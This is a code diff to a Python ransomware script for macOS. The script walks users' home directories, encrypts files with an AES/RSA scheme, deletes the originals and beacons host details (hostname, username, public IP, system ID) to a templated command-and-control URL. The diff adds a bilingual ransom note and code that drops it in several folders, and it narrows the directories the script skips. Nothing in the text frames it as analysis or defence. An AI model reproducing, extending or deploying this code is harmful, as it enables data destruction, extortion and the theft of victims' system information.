@@ -10,12 +10,13 @@ C2='{{C2_URL}}'
 SECRET='{{HANDSHAKE}}'
 RSA_PUB=b"""{{RSA_PUBLIC_KEY}}"""
 
-SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/dev','/proc','/private/var/db','/private/var/folders','/Volumes/Recovery'])
+SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/dev','/private/var/db','/Volumes/Recovery'])
 EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.pages','.numbers','.keynote'}
+NOTE='READ_ME_解密教程.txt'
 
 def skip(p):
     fp=os.path.abspath(p)
-    if fp.endswith('.jasmin'):return True
+    if fp.endswith('.jasmin') or os.path.basename(fp).startswith('READ_ME_'):return True
     for d in SKIP_DIRS:
         if fp.startswith(d+'/'):return True
     if '/.ssh/' in fp:return True
@@ -40,12 +41,40 @@ def encrypt(path,pub):
         os.remove(path);return True
     except:return False
 
-def beacon():
+RANSOM_TXT="""
+╔══════════════════════════════════════════════════╗
+║       YOUR FILES HAVE BEEN ENCRYPTED             ║
+║           你的文件已被加密                         ║
+╚══════════════════════════════════════════════════╝
+
+AES-256 + RSA-2048 军事级加密。 系统ID: {sid}
+
+⚠️ 不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
+
+🔓 解密: pip3 install cryptography
+        python3 jasmin_decrypt.py private_key.pem
+
+✅ SHA-256 校验确保文件100%还原
+"""
+
+def get_sid():
+    try:return hex(os.getuid())+'-'+socket.gethostname()
+    except:return 'unknown'
+
+def drop_notes(sid):
+    txt=RANSOM_TXT.replace('{sid}',sid)
+    home=os.path.expanduser('~')
+    for d in [home,os.path.join(home,'Desktop'),os.path.join(home,'Documents'),'/tmp','/Users']:
+        try:
+            if os.path.isdir(d):open(os.path.join(d,NOTE),'w').write(txt)
+        except:pass
+
+def beacon(sid):
     try:
         d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
            'os':f'macOS {platform.mac_ver()[0]}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
            'time':datetime.datetime.now().strftime('%H:%M:%S'),'ip':'0.0.0.0','location':'?',
-           'systemid':hex(os.getuid()),'password':'RSA_PROTECTED'}
+           'systemid':sid,'password':'RSA_PROTECTED'}
         try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
         except:pass
         req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
@@ -54,12 +83,14 @@ def beacon():
 
 def main():
     pub=serialization.load_pem_public_key(RSA_PUB,default_backend())
-    beacon()
+    sid=get_sid()
+    beacon(sid)
     n=0
     for r in [os.path.expanduser('~'),'/Users','/tmp','/var/tmp']:
         if not os.path.isdir(r):continue
         for dp,_,fs in os.walk(r):
             for f in fs:
                 if encrypt(os.path.join(dp,f),pub):n+=1
+    drop_notes(sid)
 
 if __name__=='__main__':main()
